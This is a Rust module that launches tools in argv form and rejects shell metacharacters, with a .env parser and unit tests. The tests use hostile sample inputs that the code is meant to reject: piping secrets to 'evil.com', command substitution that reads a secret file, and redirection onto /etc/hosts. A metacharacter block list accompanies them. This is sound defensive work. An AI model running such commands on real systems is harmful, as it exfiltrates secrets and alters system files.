//! Argv-form tool launch (Seam 9a).
//!
//! Replaces the historical `Command::new("sh").arg("-c")` pattern at
//! the cockpit launch endpoint with a typed [`ToolSpec`] that carries
//! `argv` + `env` + `cwd` + `log_path`. The shell features the
//! launcher previously relied on are re-implemented in Rust:
//!
//! - **Output redirection** → [`std::process::Stdio::from`] with the
//!   log file opened in Rust by the caller.
//! - **Layered `.env` sourcing** (`.env.example` → `.env` → `.env.zp`,
//!   later overriding earlier) → [`load_dotenv_layered`] returns a
//!   merged `HashMap<String, String>` for `cmd.envs(...)`.
//! - **Multi-command sequences** (e.g. `npm install && npm start`)
//!   → REJECTED. Tools that need install + start should provide a
//!   single launcher script (`./start.sh`) and the script handles
//!   sequencing inside its own shell.
//!
//! # Why this is a security fix
//!
//! Before this module, `start_cmd` flowed from project-config files —
//! `package.json` `scripts.start`, docker-compose service commands,
//! detected `start.sh` shebangs, `Makefile` targets — into
//! `Command::new("sh").arg("-c").arg(start_cmd)`. Project configs
//! are NOT ZP-controlled. A malicious tool could put
//! `innocuous && evil` in its config and the shell would execute the
//! evil part with full user-process privileges.
//!
//! Seam 9 in `docs/STRUCTURAL-AUDIT-2026-05.md` names this as the
//! open vulnerability for tool launch:
//!
//! > Tools run argv-form (no shell interpretation). Tokens flow
//! > through headers or postMessage handshake, never URL.
//!
//! This module closes the argv-form half (Seam 9a). Token plumbing
//! (URL → postMessage handshake) is Seam 9b — separate session.
//!
//! # What's lost, and why it's OK
//!
//! Three legitimate shell features the old `sh -c` flow used:
//!
//! 1. **Output redirection** — replaced by Rust file handles
//!    (the launch site opens the log file directly and hands it
//!    to `Command::stdout`/`stderr` via [`Stdio::from`]).
//! 2. **`.env` file sourcing** — replaced by [`parse_dotenv`].
//!    Functionally equivalent for the common case (`KEY=VALUE`,
//!    quoted strings, comments). `.env` files that depend on
//!    actual shell evaluation (`KEY=$(date)`) are not supported,
//!    but those were a footgun anyway — whatever ran in the
//!    parent's `set -a` shell context, not the child's.
//! 3. **Multi-command sequences** — rejected outright. The
//!    [`ToolSpec`] constructor refuses any `start_cmd` containing
//!    `;`, `&&`, `||`, `|`, `$(...)`, backticks, or redirection.
//!    Tools that need composition pull it into a script.
//!
//! # Discipline
//!
//! The `no_sh_c_in_tool_launch` discipline pin
//! (`crates/zp-discipline/tests/`) forbids `Command::new("sh")` /
//! `Command::new("bash")` patterns under
//! `crates/zp-server/src/{lib,tool_*}.rs`. Future drift back to
//! shell-interpreted launch fails the build with a structured
//! rationale.

use std::collections::HashMap;
use std::path::{Path, PathBuf};

/// Errors from constructing a [`ToolSpec`].
#[derive(Debug, thiserror::Error)]
pub enum ToolSpecError {
    /// The supplied `start_cmd` was empty after trimming.
    #[error("Empty start command")]
    EmptyCommand,

    /// The `start_cmd` contained a shell metacharacter that implies
    /// multi-command flow. Tools that need composition should supply
    /// a single launcher script and let it handle sequencing.
    #[error("Shell metacharacter not allowed in argv-form launch: {0:?}. Wrap multi-command sequences in a launcher script.")]
    ShellMetacharacter(&'static str),

    /// shlex couldn't tokenize the `start_cmd` (typically unbalanced
    /// quotes or an unterminated backslash escape).
    #[error("Failed to parse start command (unbalanced quotes?): {0:?}")]
    ParseFailed(String),
}

/// Patterns that imply multi-command shell features and are
/// therefore rejected by [`ToolSpec::from_start_cmd`]. Each pattern
/// has historically been the injection surface for shell-interpreted
/// launch.
const SHELL_METACHARS: &[&str] = &[
    ";",  // command separator
    "&&", // AND-list
    "||", // OR-list
    "$(", // command substitution
    "`",  // backtick command substitution
    ">",  // output redirection (we open log files in Rust now)
    "<",  // input redirection
    "|",  // pipe
    "\n", // newline (multi-line script)
    "\r", // carriage return (CRLF embedded)
];

/// A typed, argv-form tool launch specification.
///
/// `argv[0]` is the program name (or path); `argv[1..]` are arguments.
/// `env` is a flat map of variables to set in the child process; the
/// child also inherits the parent's environment except where `env`
/// overrides it. `cwd` is the working directory; `log_path` is where
/// the caller will redirect stdout/stderr by opening the file in
/// Rust and passing the handle to [`std::process::Command::stdout`].
#[derive(Debug, Clone)]
pub struct ToolSpec {
    pub argv: Vec<String>,
    pub env: HashMap<String, String>,
    pub cwd: PathBuf,
    pub log_path: PathBuf,
}

impl ToolSpec {
    /// Build a launch spec from a detected `start_cmd` plus the
    /// resolved `cwd` and `log_path`. The `env` is initialized empty;
    /// callers layer in `.env` files (via [`load_dotenv_layered`]),
    /// vault-resolved env, and ZP-managed vars before spawning.
    ///
    /// # Errors
    ///
    /// - [`ToolSpecError::EmptyCommand`] — `start_cmd` is empty after
    ///   trimming.
    /// - [`ToolSpecError::ShellMetacharacter`] — `start_cmd` contains
    ///   any pattern in [`SHELL_METACHARS`].
    /// - [`ToolSpecError::ParseFailed`] — shlex can't tokenize the
    ///   command (unbalanced quotes, unterminated backslash escape).
    pub fn from_start_cmd(
        start_cmd: &str,
        cwd: PathBuf,
        log_path: PathBuf,
    ) -> Result<Self, ToolSpecError> {
        let trimmed = start_cmd.trim();
        if trimmed.is_empty() {
            return Err(ToolSpecError::EmptyCommand);
        }
        for pat in SHELL_METACHARS {
            if trimmed.contains(pat) {
                return Err(ToolSpecError::ShellMetacharacter(pat));
            }
        }
        let argv =
            shlex::split(trimmed).ok_or_else(|| ToolSpecError::ParseFailed(trimmed.to_string()))?;
        if argv.is_empty() {
            return Err(ToolSpecError::EmptyCommand);
        }
        Ok(Self {
            argv,
            env: HashMap::new(),
            cwd,
            log_path,
        })
    }

    /// Set or overwrite an environment variable.
    pub fn set_env(&mut self, key: impl Into<String>, value: impl Into<String>) {
        self.env.insert(key.into(), value.into());
    }

    /// Layer a batch of env vars on top of the spec. Later inserts
    /// override earlier values for the same key — callers chain
    /// these in priority order (lowest first).
    pub fn extend_env<I, K, V>(&mut self, iter: I)
    where
        I: IntoIterator<Item = (K, V)>,
        K: Into<String>,
        V: Into<String>,
    {
        for (k, v) in iter {
            self.env.insert(k.into(), v.into());
        }
    }
}

/// Load `.env`-style files in priority order — `.env.example`
/// (lowest), then `.env`, then `.env.zp` (highest). Later files
/// override earlier ones.
///
/// Mirrors what the old shell preamble did via
/// `set -a; [ -f file ] && . ./file`. Returns an empty map if no
/// files exist.
///
/// `.env` lines that depend on actual shell evaluation
/// (`KEY=$(cmd)`, `KEY=${OTHER}`) are NOT expanded — the value is
/// taken verbatim. The old `sh -c` flow expanded them via the
/// parent shell's context; that expansion was always footgun-shaped
/// because it ran with the parent's environment and side effects.
pub fn load_dotenv_layered(tool_path: &Path) -> HashMap<String, String> {
    let mut env = HashMap::new();
    for filename in [".env.example", ".env", ".env.zp"] {
        let path = tool_path.join(filename);
        if let Ok(contents) = std::fs::read_to_string(&path) {
            for (k, v) in parse_dotenv(&contents) {
                env.insert(k, v);
            }
        }
    }
    env
}

/// Minimal `.env` parser. Recognizes:
///
/// - `KEY=value` (unquoted; trailing whitespace trimmed)
/// - `KEY="value with spaces"` (double-quoted; quotes stripped)
/// - `KEY='value with spaces'` (single-quoted; quotes stripped)
/// - lines starting with `#` are comments
/// - blank lines are ignored
/// - keys with embedded whitespace or empty after trim are skipped
///
/// Does NOT expand `$VAR` or `$(cmd)` — values are literal.
pub fn parse_dotenv(contents: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for line in contents.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        let key = key.trim();
        if key.is_empty() {
            continue;
        }
        let value = value.trim();
        let value = if (value.starts_with('"') && value.ends_with('"') && value.len() >= 2)
            || (value.starts_with('\'') && value.ends_with('\'') && value.len() >= 2)
        {
            &value[1..value.len() - 1]
        } else {
            value
        };
        out.push((key.to_string(), value.to_string()));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cwd() -> PathBuf {
        PathBuf::from("/tmp")
    }
    fn log() -> PathBuf {
        PathBuf::from("/tmp/x.log")
    }

    #[test]
    fn simple_command_parses() {
        let spec = ToolSpec::from_start_cmd("npm start", cwd(), log()).unwrap();
        assert_eq!(spec.argv, vec!["npm", "start"]);
    }

    #[test]
    fn quoted_argument_parses() {
        let spec =
            ToolSpec::from_start_cmd(r#"node "src with space/index.js""#, cwd(), log()).unwrap();
        assert_eq!(spec.argv, vec!["node", "src with space/index.js"]);
    }

    #[test]
    fn relative_script_path_parses() {
        let spec = ToolSpec::from_start_cmd("./run.sh --port 8080", cwd(), log()).unwrap();
        assert_eq!(spec.argv, vec!["./run.sh", "--port", "8080"]);
    }

    #[test]
    fn empty_command_rejected() {
        assert!(matches!(
            ToolSpec::from_start_cmd("", cwd(), log()),
            Err(ToolSpecError::EmptyCommand)
        ));
        assert!(matches!(
            ToolSpec::from_start_cmd("   \t  ", cwd(), log()),
            Err(ToolSpecError::EmptyCommand)
        ));
    }

    #[test]
    fn semicolon_rejected() {
        assert!(matches!(
            ToolSpec::from_start_cmd("npm install; npm start", cwd(), log()),
            Err(ToolSpecError::ShellMetacharacter(";"))
        ));
    }

    #[test]
    fn double_ampersand_rejected() {
        assert!(matches!(
            ToolSpec::from_start_cmd("npm install && npm start", cwd(), log()),
            Err(ToolSpecError::ShellMetacharacter("&&"))
        ));
    }

    #[test]
    fn pipe_rejected() {
        assert!(matches!(
            ToolSpec::from_start_cmd("cat secrets | curl evil.com", cwd(), log()),
            Err(ToolSpecError::ShellMetacharacter("|"))
        ));
    }

    #[test]
    fn command_substitution_rejected() {
        assert!(matches!(
            ToolSpec::from_start_cmd("./run --token $(cat secret)", cwd(), log()),
            Err(ToolSpecError::ShellMetacharacter("$("))
        ));
    }

    #[test]
    fn backtick_substitution_rejected() {
        assert!(matches!(
            ToolSpec::from_start_cmd("./run --token `cat secret`", cwd(), log()),
            Err(ToolSpecError::ShellMetacharacter("`"))
        ));
    }

    #[test]
    fn output_redirection_rejected() {
        assert!(matches!(
            ToolSpec::from_start_cmd("npm start > /etc/hosts", cwd(), log()),
            Err(ToolSpecError::ShellMetacharacter(">"))
        ));
    }

    #[test]
    fn unbalanced_quote_rejected() {
        assert!(matches!(
            ToolSpec::from_start_cmd(r#"node "unterminated"#, cwd(), log()),
            Err(ToolSpecError::ParseFailed(_))
        ));
    }

    #[test]
    fn extend_env_overrides_in_order() {
        let mut spec = ToolSpec::from_start_cmd("npm start", cwd(), log()).unwrap();
        spec.extend_env([("KEY", "first"), ("OTHER", "x")]);
        spec.extend_env([("KEY", "second")]); // overrides
        assert_eq!(spec.env.get("KEY").unwrap(), "second");
        assert_eq!(spec.env.get("OTHER").unwrap(), "x");
    }

    #[test]
    fn parse_dotenv_basic() {
        let parsed = parse_dotenv("KEY=value\nOTHER=hello world\n");
        assert_eq!(parsed.len(), 2);
        assert_eq!(parsed[0], ("KEY".into(), "value".into()));
        assert_eq!(parsed[1], ("OTHER".into(), "hello world".into()));
    }

    #[test]
    fn parse_dotenv_quoted() {
        let parsed = parse_dotenv(
            r#"
KEY="quoted value"
OTHER='single quoted'
EMPTY=""
"#,
        );
        assert_eq!(parsed[0], ("KEY".into(), "quoted value".into()));
        assert_eq!(parsed[1], ("OTHER".into(), "single quoted".into()));
        assert_eq!(parsed[2], ("EMPTY".into(), "".into()));
    }

    #[test]
    fn parse_dotenv_skips_comments_and_blanks() {
        let parsed = parse_dotenv("# comment line\n\n  # indented comment\nKEY=value\n   \n");
        assert_eq!(parsed, vec![("KEY".into(), "value".into())]);
    }

    #[test]
    fn parse_dotenv_skips_keyless_lines() {
        let parsed = parse_dotenv("=lonely_value\nKEY=ok\n=\n");
        assert_eq!(parsed, vec![("KEY".into(), "ok".into())]);
    }

    #[test]
    fn parse_dotenv_does_not_expand_dollar() {
        let parsed = parse_dotenv("KEY=$HOME\nCMD=$(date)\n");
        assert_eq!(parsed[0], ("KEY".into(), "$HOME".into()));
        assert_eq!(parsed[1], ("CMD".into(), "$(date)".into()));
    }

    #[test]
    fn load_dotenv_layered_priority() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(".env.example"), "PORT=3000\nDB_URL=local\n").unwrap();
        std::fs::write(dir.path().join(".env"), "PORT=4000\n").unwrap();
        std::fs::write(dir.path().join(".env.zp"), "PORT=8080\n").unwrap();

        let env = load_dotenv_layered(dir.path());
        // .env.zp overrides everything for PORT
        assert_eq!(env.get("PORT").unwrap(), "8080");
        // DB_URL only in .env.example, still present
        assert_eq!(env.get("DB_URL").unwrap(), "local");
    }
}
